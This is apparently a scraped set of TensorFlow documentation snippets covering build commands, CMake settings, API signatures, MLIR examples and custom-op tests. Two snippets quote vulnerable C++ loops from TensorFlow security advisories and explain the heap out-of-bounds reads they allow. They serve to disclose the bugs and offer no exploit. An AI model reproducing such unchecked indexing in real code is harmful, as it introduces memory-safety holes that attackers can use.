SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/autograph/g3doc/pyct_tutorial.ipynb#_snippet_2

LANGUAGE: python
CODE:
```
import gast
from tensorflow.python.autograph.pyct import transpiler

class PyToBasicCpp(transpiler.GenericTranspiler):

  def transform_ast(self, node, ctx):
    codegen = BasicCppCodegen(ctx)
    codegen.visit(node)
    return codegen.code_buffer
```

----------------------------------------

TITLE: Allowed Export Formats Python
DESCRIPTION: A class variable defining the tuple of allowed export formats for the object detection model.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/object_detector/ObjectDetector.md#_snippet_9

LANGUAGE: python
CODE:
```
ALLOWED_EXPORT_FORMAT(
 <ExportFormat.TFLITE: 'TFLITE'>,
 <ExportFormat.SAVED_MODEL: 'SAVED_MODEL'>,
 <ExportFormat.LABEL: 'LABEL'>)
```

----------------------------------------

TITLE: Build Native flatc Compiler for Cross-compilation (CMake)
DESCRIPTION: Builds the `flatc` compiler executable for the host machine architecture using CMake. This native tool is necessary when cross-compiling TF Lite kernel tests to generate test data, as the target device cannot typically run the compiler.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/build_cmake.md#_snippet_9

LANGUAGE: sh
CODE:
```
mkdir flatc-native-build && cd flatc-native-build
cmake ../tensorflow_src/tensorflow/lite/tools/cmake/native_tools/flatbuffers
cmake --build .
```

----------------------------------------

TITLE: Setting Environment Variables for Non-Hermetic CUDA (Shell/Bazelrc)
DESCRIPTION: This snippet provides examples of environment variables to set in a shell or `.bazelrc` file when using the deprecated non-hermetic CUDA setup. These variables inform Bazel about the paths and versions of the locally installed CUDA, CUDNN, and NCCL libraries and toolkits.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/hermetic_cuda.md#_snippet_16

LANGUAGE: Shell
CODE:
```
build:cuda --action_env=TF_CUDA_VERSION=<locally installed cuda version>
build:cuda --action_env=TF_CUDNN_VERSION=<locally installed cudnn version>
build:cuda --action_env=TF_CUDA_COMPUTE_CAPABILITIES=<CUDA compute capabilities>
build:cuda --action_env=LD_LIBRARY_PATH=<CUDA/CUDNN libraries folder locations divided by â:â sign>
build:cuda --action_env=CUDA_TOOLKIT_PATH=<preinstalled CUDA folder location>
build:cuda --action_env=TF_CUDA_PATHS=<preinstalled CUDA/CUDNN folder locations divided by â,â sign>
build:cuda --action_env=NCCL_INSTALL_PATH=<preinstalled NCCL library folder location>
```

----------------------------------------

TITLE: Checking if Tensor Names Exist | TensorFlow Lite Support Python
DESCRIPTION: Checks if the `TensorNames` list for the group is empty or not set. Returns a boolean indicating whether there are any tensor names associated with this group.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/TensorGroup.md#_snippet_6

LANGUAGE: python
CODE:
```
TensorNamesIsNone()
```

----------------------------------------

TITLE: Enabling Hermetic CUDA Library Inclusion (Bazel config)
DESCRIPTION: Provides the Bazel configuration line to add to `.bazelrc` under the `:cuda` config. Setting `--@local_config_cuda//cuda:include_cuda_libs=true` ensures that the hermetic CUDA dependencies are correctly linked or provided to built executables and tests, which is necessary for them to run successfully.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/hermetic_cuda.md#_snippet_3

LANGUAGE: Bazel config
CODE:
```
build:cuda --@local_config_cuda//cuda:include_cuda_libs=true
```

----------------------------------------

TITLE: Packing FeaturePropertiesT into Builder in Python
DESCRIPTION: Packs the current `FeaturePropertiesT` object's data into a FlatBuffers builder. This is used to serialize the object's data into a buffer format for storage or transmission.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/FeaturePropertiesT.md#_snippet_4

LANGUAGE: python
CODE:
```
Pack(
    builder
)
```

----------------------------------------

TITLE: Adding Android Log Dependency CMake
DESCRIPTION: Finds the Android logging library (`log`) using `find_library` and adds it to the list of target dependencies required for building TensorFlow Lite specifically on the Android operating system.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/CMakeLists.txt#_snippet_20

LANGUAGE: CMake
CODE:
```
if(CMAKE_SYSTEM_NAME MATCHES "Android")
  find_library(ANDROID_LOG_LIB log)
  list(APPEND TFLITE_TARGET_DEPENDENCIES
    log
  )
endif()
```

----------------------------------------

TITLE: Validate Classification Model Format - Shell
DESCRIPTION: Runs the `ovic_validator` binary built via Bazel to check the format of a TFLite classification model file. Replace `/path/to/my_model.lite` with the actual path to your model file. The second argument `classify` specifies the task type for validation.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/java/ovic/README.md#_snippet_5

LANGUAGE: sh
CODE:
```
bazel-bin/tensorflow/lite/java/ovic/ovic_validator /path/to/my_model.lite classify
```

----------------------------------------

TITLE: Defining TFLite Compatible Function Wrapper - Python
DESCRIPTION: This is the function signature for the `tf.lite.experimental.authoring.compatible` decorator. It is applied to a `tf.function` to enable TFLite compatibility checking during execution. Key arguments include `target` (the function to wrap) and `converter_target_spec`.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tf/lite/experimental/authoring/compatible.md#_snippet_0

LANGUAGE: python
CODE:
```
tf.lite.experimental.authoring.compatible(
    target=None, converter_target_spec=None, **kwargs
)
```

----------------------------------------

TITLE: Illustrating Vulnerable Loop in TensorFlow C++
DESCRIPTION: This C++ snippet from the `RaggedCountSparseOutput` implementation illustrates the loop structure responsible for the heap buffer overflow vulnerability. It iterates through the `values` tensor and attempts to find the corresponding batch index using the `splits_values` tensor. The lack of validation on `splits` means that if `splits_values` does not correctly partition `values` or is too short, the `while` loop can cause an out-of-bounds read when `batch_idx` exceeds the bounds of `splits_values`.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2020-015.md#_snippet_0

LANGUAGE: C++
CODE:
```
    for (int idx = 0; idx < num_values; ++idx) {
      while (idx >= splits_values(batch_idx)) {
        batch_idx++;
      }
      // ...
    }
```

----------------------------------------

TITLE: Install TensorFlow Lite Pip Wheel (Shell)
DESCRIPTION: Installs the generated TensorFlow Lite Python wheel file using pip. The placeholder `<wheel>` should be replaced with the actual path to the `.whl` file produced by the build process. The `--upgrade` flag is used to ensure any existing version is replaced.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/tools/pip_package/README.md#_snippet_1

LANGUAGE: sh
CODE:
```
pip install --upgrade <wheel>
```

----------------------------------------

TITLE: Install TensorFlow Lite AAR to Local Maven Repository
DESCRIPTION: Use the Maven install:install-file command to add the locally built TensorFlow Lite AAR file into your local Maven repository (.m2 directory). This makes the AAR available as a standard Maven dependency for any project configured to use mavenLocal().
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/android/lite_build.md#_snippet_9

LANGUAGE: sh
CODE:
```
mvn install:install-file \
  -Dfile=bazel-bin/tensorflow/lite/java/tensorflow-lite.aar \
  -DgroupId=org.tensorflow \
  -DartifactId=tensorflow-lite -Dversion=0.1.100 -Dpackaging=aar
```

----------------------------------------

TITLE: Building TensorFlow C Library Package using Bazel (Shell)
DESCRIPTION: These commands use the Bazel build system to first test and then build the TensorFlow C API library into a distributable archive. The output is a `libtensorflow.tar.gz` file located in the `bazel-bin` directory.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/tools/lib_package/README.md#_snippet_0

LANGUAGE: Shell
CODE:
```
bazel test --config opt //tensorflow/tools/lib_package:libtensorflow_test
bazel build --config opt //tensorflow/tools/lib_package:libtensorflow
```

----------------------------------------

TITLE: Run COCO Minival Preprocessing Script - Bazel/Shell
DESCRIPTION: Executes the `preprocess_coco_minival` Python script to filter and prepare a subset of the COCO 2014 minival dataset (images and ground truth proto) required for on-device evaluation. Requires paths to original COCO images, instances file, allowlist file, and an output directory.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/tools/evaluation/tasks/coco_object_detection/README.md#_snippet_0

LANGUAGE: Bazel/Shell
CODE:
```
bazel run //tensorflow/lite/tools/evaluation/tasks/coco_object_detection:preprocess_coco_minival -- \
  --images_folder=/path/to/val2014 \
  --instances_file=/path/to/instances_val2014.json \
  --allowlist_file=/path/to/minival_allowlist.txt \
  --output_folder=/path/to/output/folder
```

----------------------------------------

TITLE: Define MLIR Function (Original Example) - TFLite/MLIR
DESCRIPTION: Defines an example MLIR function (@func_1_GPU_FLOAT) containing a basic tfl.add operation, tagged for execution on the "GPU" device with "FLOAT" inference type. This represents a function structure before device-specific subgraph alternative generation.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/lite/experimental/tac/README.md#_snippet_8

LANGUAGE: MLIR
CODE:
```
 func private @func_1_GPU_FLOAT(%arg0: tensor<1xf32>, %arg1: tensor<1xf32>) -> tensor<1xf32> attributes {tac.device = "GPU", tac.inference_type = "FLOAT", tac.interface_name = "func_1"} {
    %0 = tfl.add %arg0, %arg1 {fused_activation_function = "RELU6", tac.device = "GPU", tac.inference_type = "FLOAT"} : tensor<1xf32>
    return %0 : tensor<1xf32>
  }
```

----------------------------------------

TITLE: Lowering tf.Tanh to TOSA MLIR
DESCRIPTION: Documents the trivial lowering of the TensorFlow `tf.Tanh` operation, which computes the hyperbolic tangent element-wise, directly to the TOSA dialect's `tosa.TANH` operation.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/tosa/g3doc/legalization.md#_snippet_44

LANGUAGE: MLIR
CODE:
```
This operator is trivially lowered to tosa.TANH.
```

LANGUAGE: MLIR
CODE:
```
tosa.TANH
```

----------------------------------------

TITLE: Initializing TextClassifier in TFLite Model Maker Python
DESCRIPTION: This snippet shows the signature for the TextClassifier class constructor. It initializes the classifier object using a model specification, a list mapping indices to label names, and an optional shuffle flag.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/text_classifier/TextClassifier.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_model_maker.text_classifier.TextClassifier(
    model_spec, index_to_label, shuffle=True
)
```

----------------------------------------

TITLE: Handling Custom Image Dataset Archive (Python/Shell)
DESCRIPTION: Processes a user-uploaded custom dataset archive if `use_custom_dataset` is True. It unzips the archive and sets the input directory name. If the dataset is not pre-split, it calls `split_into_train_test` to perform the split and sets the `IMAGES_ROOT` variable.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/tutorials/pose_classification.ipynb#_snippet_7

LANGUAGE: Python
CODE:
```
if use_custom_dataset:
  # ATTENTION:
  # You must edit these two lines to match your archive and images folder name:
  # !tar -xf YOUR_DATASET_ARCHIVE_NAME.tar
  !unzip -q YOUR_DATASET_ARCHIVE_NAME.zip
  dataset_in = 'YOUR_DATASET_DIR_NAME'

  # You can leave the rest alone:
  if not os.path.isdir(dataset_in):
    raise Exception("dataset_in is not a valid directory")
  if dataset_is_split:
    IMAGES_ROOT = dataset_in
  else:
    dataset_out = 'split_' + dataset_in
    split_into_train_test(dataset_in, dataset_out, test_split=0.2)
    IMAGES_ROOT = dataset_out
```

----------------------------------------

TITLE: Append Core TensorFlow Lite Library (CMake)
DESCRIPTION: This command appends the main TensorFlow Lite library (`tensorflow-lite`) to the list of libraries required by the benchmark tool, stored in the `TFLITE_BENCHMARK_LIBS` variable.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/tools/benchmark/CMakeLists.txt#_snippet_1

LANGUAGE: CMake
CODE:
```
list(APPEND TFLITE_BENCHMARK_LIBS
  tensorflow-lite
)
```

----------------------------------------

TITLE: Check Equality TFLite Support FeatureVector Python
DESCRIPTION: Compares the current `FeatureVector` instance with another object for equality. The comparison checks if the underlying vector values are identical. It accepts any object type and returns a boolean indicating whether the objects are considered equal based on their vector data.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/task/processor/FeatureVector.md#_snippet_1

LANGUAGE: python
CODE:
```
__eq__(
    other: Any
) -> bool

```

----------------------------------------

TITLE: Implementing Loop with tf_executor.graph MLIR
DESCRIPTION: This MLIR example demonstrates implementing a simple decrementing loop within a `tf_executor.graph`. It utilizes several `tf_executor` operations like `Enter`, `Merge`, `Switch`, `NextIteration.Source`/`Sink`, `Exit`, and nested `island` operations to manage control flow and data dependencies. The loop terminates when the counter reaches zero, and the final value is fetched.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/tensorflow/g3doc/tf_dialects.md#_snippet_4

LANGUAGE: MLIR
CODE:
```
// Loop `%count.init` times and return the last counter (always zero)
%fetches = tf_executor.graph {

  %loop.init, %ctl0 = tf_executor.Enter %count.init : i32

  %next_count, %tok = tf_executor.NextIteration.Source : i32

  %loop.body.init, %ctlMerge = tf_executor.Merge %loop.init, %next_count : i32

  %dec_count, %ctlAdd = tf_executor.island
    wraps tf.Add %loop.body.init, -1 : (i32, i32) -> i32

  %loop_cond, %ctlNE = tf_executor.island
    wraps tf.NotEqual %dec_count, 0 : (i32, i32) -> i1

  %true, %false, %ctlSwitch = tf_executor.Switch %loop_cond, %dec_count  : i32

  tf_executor.NextIteration.Sink[%tok] %false : i32

  %exit_count, %ctlExit = tf_executor.Exit %true : i32

  tf_executor.fetch %exit_count : i32
} // end of the "tf_executor.graph" operation/region
```

----------------------------------------

TITLE: Download Image Segmenter Assets (Shell)
DESCRIPTION: These commands download an example TFLite image segmentation model (deeplabv3.tflite) and its corresponding label file (labelmap.txt). These files are used as input for demonstrating the metadata writing process for image segmentation models.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/convert/metadata_writer_tutorial.ipynb#_snippet_9

LANGUAGE: shell
CODE:
```
!curl -L https://github.com/tensorflow/tflite-support/raw/master/tensorflow_lite_support/metadata/python/tests/testdata/image_segmenter/deeplabv3.tflite -o deeplabv3.tflite
!curl -L https://github.com/tensorflow/tflite-support/raw/master/tensorflow_lite_support/metadata/python/tests/testdata/image_segmenter/labelmap.txt -o deeplabv3_labels.txt
```

----------------------------------------

TITLE: Bazel Compile Flags for Coral Edge TPU (Bash)
DESCRIPTION: This Bash snippet provides the necessary Bazel compile flags for building a C++ project that uses the Coral Edge TPU delegate plugin. It includes flags for both Linux and macOS (`--define darwinn_portable=1`, `--linkopt`) and notes the specific library path needed for MacPorts or Homebrew on macOS.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/inference_with_metadata/task_library/overview.md#_snippet_8

LANGUAGE: Bash
CODE:
```
# On the Linux
--define darwinn_portable=1 --linkopt=-lusb-1.0

# On the macOS, add '--linkopt=-lusb-1.0 --linkopt=-L/opt/local/lib/' if you are
# using MacPorts or '--linkopt=-lusb-1.0 --linkopt=-L/opt/homebrew/lib' if you
# are using Homebrew.
--define darwinn_portable=1 --linkopt=-L/opt/local/lib/ --linkopt=-lusb-1.0

# Windows is not supported yet.
```

----------------------------------------

TITLE: Linking Python Tests to Main Target (CMake)
DESCRIPTION: Adds the `check-mlir-hlo-python` target as a dependency to the `check-mlir-hlo` target. This ensures that all Python tests aggregated under `check-mlir-hlo-python` are executed when the main `check-mlir-hlo` target is built or checked.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/xla/mlir_hlo/tests/python/CMakeLists.txt#_snippet_3

LANGUAGE: CMake
CODE:
```
add_dependencies(check-mlir-hlo check-mlir-hlo-python)
```

----------------------------------------

TITLE: Initializing FeaturePropertiesT from Packed Buffer in Python
DESCRIPTION: A class method to initialize a `FeaturePropertiesT` object from a packed buffer, optionally starting at a specified position. Useful for deserializing data from a buffer formatted in a packed structure.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/FeaturePropertiesT.md#_snippet_3

LANGUAGE: python
CODE:
```
@classmethod
InitFromPackedBuf(
    buf, pos=0
)
```

----------------------------------------

TITLE: Initializing StatsT From Object Python
DESCRIPTION: A class method used to initialize a new `StatsT` object based on the data contained within an existing `stats` object. This method facilitates creating a copy or converting between different representations of the `StatsT` structure.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/StatsT.md#_snippet_2

LANGUAGE: Python
CODE:
```
@classmethod
InitFromObj(
    stats
)
```

----------------------------------------

TITLE: Initializing ImageSizeT Object in Python
DESCRIPTION: Initializes a new instance of the `ImageSizeT` class. This likely creates a default object ready to be populated or used, representing image dimensions within the TFLite metadata schema.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/ImageSizeT.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_support.metadata_schema_py_generated.ImageSizeT()
```

----------------------------------------

TITLE: Testing Custom Op Error Handling for Bad Input Types (Graph/Eager)
DESCRIPTION: This test case verifies that the custom multiplex op correctly raises an error when inputs have mismatched data types (float vs. int). It uses `self.assertRaisesRegex` to catch exceptions and checks if the error message matches expected patterns that differ slightly between eager and graph execution modes.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/examples/custom_ops_doc/multiplex_1/README.md#_snippet_9

LANGUAGE: python
CODE:
```
  @test_util.run_in_graph_and_eager_modes
  def test_multiplex_bad_types(self):
    a = tf.constant([1.0, 2.0, 3.0, 4.0, 5.0])  # float
    b = tf.constant([10, 20, 30, 40, 50])  # int32
    cond = tf.constant([True, False, True, False, True], dtype=bool)
    with self.assertRaisesRegex(
        (errors_impl.InvalidArgumentError, TypeError),
        # Eager mode raises InvalidArgumentError with the following message
        r'(cannot compute Examples1>MultiplexDense as input #2\(zero-based\) '
        r'was expected to be a float tensor but is a int32 tensor '
        r'\[Op:Examples1>MultiplexDense\]'
        r')|('\n        # Graph mode raises TypeError with the following message
        r"Input 'b_values' of 'Examples1>MultiplexDense' Op has type int32 that "
        r"does not match type float32 of argument 'a_values'.")":
      self.evaluate(multiplex_1_op.multiplex(cond, a, b))
```

----------------------------------------

TITLE: Build TensorFlow Lite Fat AAR with Bazel
DESCRIPTION: Execute this Bazel command from the TensorFlow root directory to build a 'fat' Android AAR file for TensorFlow Lite. It includes multiple CPU architectures (x86, x86_64, arm64-v8a, armeabi-v7a) and uses specific C++ and Android build tool configurations.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/android/lite_build.md#_snippet_6

LANGUAGE: sh
CODE:
```
bazel build -c opt --cxxopt=--std=c++17 --config=android_arm64 \
  --fat_apk_cpu=x86,x86_64,arm64-v8a,armeabi-v7a \
  --define=android_dexmerger_tool=d8_dexmerger \
  --define=android_incremental_dexing_tool=d8_dexbuilder \
  //tensorflow/lite/java:tensorflow-lite
```

----------------------------------------

TITLE: Initializing Operation Data - C++
DESCRIPTION: Defines the function signature for the `Create` function, which initializes the operation data structure using the operation's attributes.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/experimental/shlo/README.md#_snippet_1

LANGUAGE: C++
CODE:
```
ExampleOp Create(const ExampleOp::Attributes&);
```

----------------------------------------

TITLE: Defining MLIR-HLO Test Dependencies (CMake)
DESCRIPTION: Defines a CMake variable MLIR_HLO_TEST_DEPENDS listing the required tools and files needed to run the MLIR-HLO LIT tests, such as FileCheck, count, not, and the mlir-hlo-opt binary.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/xla/mlir_hlo/tests/CMakeLists.txt#_snippet_1

LANGUAGE: CMake
CODE:
```
set(MLIR_HLO_TEST_DEPENDS
        FileCheck count not
        mlir-hlo-opt
)
```

----------------------------------------

TITLE: Getting Root Stats Object in Python
DESCRIPTION: This class method retrieves the root `Stats` object from a given FlatBuffers buffer and offset. It's typically used to deserialize the buffer into a Python object representation of the statistical metadata.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/Stats.md#_snippet_0

LANGUAGE: Python
CODE:
```
@classmethod
GetRootAs(
    buf, offset=0
)
```

----------------------------------------

TITLE: Getting Default Quantization Config [Python]
DESCRIPTION: Retrieves the default configuration settings recommended for applying post-training quantization to the model created with YamNetSpec.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/audio_classifier/YamNetSpec.md#_snippet_4

LANGUAGE: python
CODE:
```
get_default_quantization_config()
```

----------------------------------------

TITLE: Check BertTokenizerOptions Buffer Identifier Python
DESCRIPTION: Checks if the provided buffer contains the identifier for a `BertTokenizerOptions` flatbuffer. Useful for verifying the type of data in a buffer before attempting to parse it.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/BertTokenizerOptions.md#_snippet_0

LANGUAGE: python
CODE:
```
@classmethod
BertTokenizerOptionsBufferHasIdentifier(
    buf, offset, size_prefixed=False
)
```

----------------------------------------

TITLE: Concatenating 1D Arrays in XLA C++
DESCRIPTION: Provides a simple example of concatenating multiple 1-dimensional arrays using the `Concat` operation in XLA. It shows the input arrays and the resulting concatenated 1D array.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/operation_semantics.md#_snippet_8

LANGUAGE: C++
CODE:
```
Concat({{2, 3}, {4, 5}, {6, 7}}, 0)
>>> {2, 3, 4, 5, 6, 7}
```

----------------------------------------

TITLE: Defining TensorFlow Custom Op Python Tests Bazel
DESCRIPTION: Defines a Bazel build rule (`tf_py_test`) for the Python test suite of the `multiplex_4` custom op. It lists the test source file (`multiplex_4_test.py`), required size, Python version, tags for filtering tests, and dependencies on the op wrapper, utility libraries (NumPy, TensorFlow), and TensorFlow testing frameworks. This rule allows Bazel to build and run the custom op tests.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/examples/custom_ops_doc/multiplex_4/README.md#_snippet_9

LANGUAGE: Bazel
CODE:
```
tf_py_test(
    name = "multiplex_4_test",
    size = "medium",  # This test blocks because it writes and reads a file,
    srcs = ["multiplex_4_test.py"],
    python_version = "PY3",
    srcs_version = "PY3",
    tags = [
        "no_mac",
        "no_pip",
    ],
    deps = [
        ":model_using_multiplex",
        ":multiplex_4_op",
        "//third_party/py/numpy",
        "//third_party/py/tensorflow",
        "//third_party/tensorflow/python/framework:errors",
        "//third_party/tensorflow/python/framework:test_lib",
    ],
)
```

----------------------------------------

TITLE: Calling TFLite AssociatedFileAddLocale Python Function
DESCRIPTION: This snippet displays the signature for invoking the `AssociatedFileAddLocale` function, which is part of the TFLite Support library's metadata schema generation. It is typically used during the process of building TFLite metadata using FlatBuffers, requiring a `builder` object and the `locale` string to associate with a file.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/AssociatedFileAddLocale.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_support.metadata_schema_py_generated.AssociatedFileAddLocale(
    builder, locale
)
```

----------------------------------------

TITLE: Append Additional Required Libraries (CMake)
DESCRIPTION: This command appends various profiling, protocol buffer, and Abseil libraries to the `TFLITE_BENCHMARK_LIBS` variable, which are necessary dependencies for the benchmark tool's functionality.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/tools/benchmark/CMakeLists.txt#_snippet_2

LANGUAGE: CMake
CODE:
```
list(APPEND TFLITE_BENCHMARK_LIBS
  profiling_info_proto
  feature_proto
  example_proto
  model_runtime_info_proto
  protobuf::libprotobuf
  absl::log
)
```

----------------------------------------

TITLE: Generate TFLite Latency Benchmark HTML Report Android ADB
DESCRIPTION: Retrieves the latency benchmark report HTML file from the app's private data directory on the device using `adb shell run-as` and `cat`. It saves the output to a temporary local file (`/tmp/dpb-latency.html`) and then automatically opens this file in the default web browser using `xdg-open` for a comprehensive, formatted summary of results.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/tools/benchmark/experimental/delegate_performance/android/README.md#_snippet_12

LANGUAGE: ADB Shell
CODE:
```
adb shell run-as org.tensorflow.lite.benchmark.delegateperformance "cat /data/user/0/org.tensorflow.lite.benchmark.delegateperformance/files/delegate_performance_result/latency/report.html" > /tmp/dpb-latency.html && xdg-open /tmp/dpb-latency.html
```

----------------------------------------

TITLE: Getting Output Tensor Groups Length in TensorFlow Lite Metadata (Python)
DESCRIPTION: Retrieves the length or count of output tensor groups defined within the TensorFlow Lite model metadata structure. This function is automatically generated from the FlatBuffer schema and accesses the underlying buffer.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/SubGraphMetadata.md#_snippet_26

LANGUAGE: python
CODE:
```
OutputTensorGroupsLength()
```

----------------------------------------

TITLE: Get Dimension Name - TensorMetadata (Python)
DESCRIPTION: Retrieves the name of the tensor dimension at the specified index j. This allows accessing descriptive names assigned to each dimension.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/TensorMetadata.md#_snippet_5

LANGUAGE: python
CODE:
```
DimensionNames(
    j
)
```

----------------------------------------

TITLE: Accessing Subgraph Metadata in ModelMetadata
DESCRIPTION: Retrieves subgraph metadata entry by index. This method requires an index `j` to specify which subgraph's metadata to retrieve.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/ModelMetadata.md#_snippet_12

LANGUAGE: python
CODE:
```
SubgraphMetadata(
    j
)
```

----------------------------------------

TITLE: Initializing tflite_support.task.processor.QaAnswer in Python
DESCRIPTION: This snippet shows the signature for the constructor of the `QaAnswer` class. It is used to create a new instance representing an answer, requiring a position object and the answer text string.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/task/processor/QaAnswer.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_support.task.processor.QaAnswer(
 pos: tflite_support.task.processor.Pos,
 text: str
)
```

----------------------------------------

TITLE: Using ReplaceMatchingOpTypes C++
DESCRIPTION: Illustrates the usage of the `ReplaceMatchingOpTypes` helper function in C++ to find and replace subgraphs matching a specific `OpTypePattern`. It includes the pattern definition and a lambda callback that demonstrates how to access matched nodes and create new replacement nodes like `FusedResizeAndPadConv2D`.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/tools/graph_transforms/README.md#_snippet_14

LANGUAGE: C++
CODE:
```
TF_RETURN_IF_ERROR(ReplaceMatchingOpTypes(
    input_graph_def,  // clang-format off
    {"Conv2D",
        {
            {"ResizeBilinear"},
            {"*"}
        }
    },  // clang-format on
    [](const NodeMatch& match, const std::set<string>& input_nodes,
       const std::set<string>& output_nodes,
       std::vector<NodeDef>* new_nodes) {
      // Find all the nodes we expect in the subgraph.
      const NodeDef& conv_node = match.node;
      const NodeDef& resize_node = match.inputs[0].node;
      const NodeDef& weights_node = match.inputs[1].node;

      // We'll be reusing the old weights.
      new_nodes->push_back(weights_node);

      // Create a 'no-op' mirror padding node that has no effect.
      NodeDef pad_dims_node;
      pad_dims_node.set_op("Const");
      pad_dims_node.set_name(conv_node.name() + "_dummy_paddings");
      SetNodeAttr("dtype", DT_INT32, &pad_dims_node);
      SetNodeTensorAttr<int32>("value", {4, 2}, {0, 0, 0, 0, 0, 0, 0, 0},
                               &pad_dims_node);
      new_nodes->push_back(pad_dims_node);

      // Set up the new fused version of the convolution op.
      NodeDef fused_conv;
      fused_conv.set_op("FusedResizeAndPadConv2D");
      fused_conv.set_name(match.node.name());
      AddNodeInput(resize_node.input(0), &fused_conv);
      AddNodeInput(resize_node.input(1), &fused_conv);
      AddNodeInput(pad_dims_node.name(), &fused_conv);
      AddNodeInput(conv_node.input(1), &fused_conv);
      CopyNodeAttr(resize_node, "align_corners", "resize_align_corners",
                   &fused_conv);
      SetNodeAttr("mode", "REFLECT", &fused_conv);
      CopyNodeAttr(conv_node, "T", "T", &fused_conv);
      CopyNodeAttr(conv_node, "padding", "padding", &fused_conv);
      CopyNodeAttr(conv_node, "strides", "strides", &fused_conv);
      new_nodes->push_back(fused_conv);

      return OkStatus();
    },
    {}, &replaced_graph_def));
```

----------------------------------------

TITLE: Calculating Output Dimensions in TFLite ExpandDims C++
DESCRIPTION: This C++ code snippet, part of the TFLite `expand_dims` kernel, calculates the output tensor dimensions based on input dimensions and the specified axis. It contains a vulnerability where a large negative 'axis' value can bypass a check and cause a heap out-of-bounds read when accessing `input_dims.data[i - 1]` within the loop.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-160.md#_snippet_0

LANGUAGE: cc
CODE:
```
  if (axis < 0) {
    axis = input_dims.size + 1 + axis;
  }
  TF_LITE_ENSURE(context, axis <= input_dims.size);

  TfLiteIntArray* output_dims = TfLiteIntArrayCreate(input_dims.size + 1);
  for (int i = 0; i < output_dims->size; ++i) {
    if (i < axis) {
      output_dims->data[i] = input_dims.data[i];
    } else if (i == axis) {
      output_dims->data[i] = 1;
    } else {
      output_dims->data[i] = input_dims.data[i - 1];
    }
  }
```

----------------------------------------

TITLE: Accessing Tensor Data in C++ Kernel
